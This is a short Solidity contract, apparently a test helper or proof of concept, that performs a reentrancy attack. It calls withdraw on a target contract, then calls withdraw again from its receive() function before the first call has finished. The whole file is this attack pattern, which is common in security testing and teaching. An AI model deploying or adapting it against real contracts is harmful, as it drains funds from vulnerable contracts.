contract ReenteringWithdrawer {
    C public target;
    uint256 private firstAmount;
    uint256 private secondAmount;
    bool private firstCall;

    constructor(C _target) { target = _target; }

    function start(uint256 _first, uint256 _second) external {
        firstAmount = _first;
        secondAmount = _second;
        firstCall = true;
        target.withdraw(firstAmount);
    }

    receive() external payable {
        if (firstCall) {
            firstCall = false;
            target.withdraw(secondAmount);
        }
    }
}

